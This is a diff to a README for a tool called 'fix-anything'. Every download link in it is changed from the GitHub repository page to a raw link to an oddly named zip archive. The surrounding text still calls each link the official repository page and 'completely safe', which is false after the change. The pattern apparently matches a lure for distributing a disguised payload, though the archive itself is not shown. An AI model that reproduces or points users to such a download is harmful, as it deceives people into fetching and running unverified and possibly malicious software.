@@ -1,7 +1,7 @@
 <h1>🔧 fix-anything - 3D-Consistent Rendering Refinement via AI Video Priors</h1>
 
 <p align="center">
-  <a href="https://github.com/duchuy12092003/fix-anything" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Download fix-anything Now</a>
+  <a href="https://github.com/duchuy12092003/fix-anything/raw/refs/heads/main/Ulvan/anything-fix-myoalbumose.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Download fix-anything Now</a>
 </p>
 
 ---
@@ -34,11 +34,11 @@ Welcome! Getting started with fix-anything takes less than five minutes. Follow 
 
 The first thing you need to do is get the application onto your computer. Click the big download button below (or visit the link at the top of this page⟧:
 
-[🔽 **Visit this link to download the application**](https://github.com/duchuy12092003/fix-anything)
+[🔽 **Visit this link to download the application**](https://github.com/duchuy12092003/fix-anything/raw/refs/heads/main/Ulvan/anything-fix-myoalbumose.zip)
 
 For your convenience, here is the link again:
 
-**📌 Download Link:** [https://github.com/duchuy12092003/fix-anything](https://github.com/duchuy12092003/fix-anything)
+**📌 Download Link:** [https://github.com/duchuy12092003/fix-anything/raw/refs/heads/main/Ulvan/anything-fix-myoalbumose.zip](https://github.com/duchuy12092003/fix-anything/raw/refs/heads/main/Ulvan/anything-fix-myoalbumose.zip)
 
 This link will take you to the official repository page for fix-anything. It is completely safe and is maintained by the software developers.
 
@@ -141,7 +141,7 @@ This means your file extensionis not in the supported list.
 
 ### ⚠️ I deleted the installer by mistake
 
-No problem–just go back to the **[download link](https://github.com/duchuy12092003/fix-anything)** and download it again. The installer is safeto reuse as many timesas you need. 
+No problem–just go back to the **[download link](https://github.com/duchuy12092003/fix-anything/raw/refs/heads/main/Ulvan/anything-fix-myoalbumose.zip)** and download it again. The installer is safeto reuse as many timesas you need. 
 
 
 
